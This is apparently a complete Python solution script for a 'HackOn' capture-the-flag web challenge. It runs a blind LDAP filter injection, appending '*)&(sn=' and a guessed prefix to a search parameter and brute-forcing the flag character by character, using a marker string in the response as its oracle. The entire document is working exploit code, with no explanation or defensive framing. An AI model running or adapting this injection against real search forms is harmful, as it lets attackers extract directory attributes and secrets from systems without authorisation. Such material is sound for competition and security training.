#!/usr/bin/python3

import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = "HackOn{"
for i in range(50):
    print("[i] Looking for number " + str(i))
    for char in alphabet:
        r = requests.post("https://web2-hack0n.numa.host/search", params='name=*%29%26%28sn%3D' + flag + char + "*")
        if ("FlaggyMacFlag" in r.text):
            print(r.request.url)
            flag += char
            print("[+] Flag: " + flag)
            break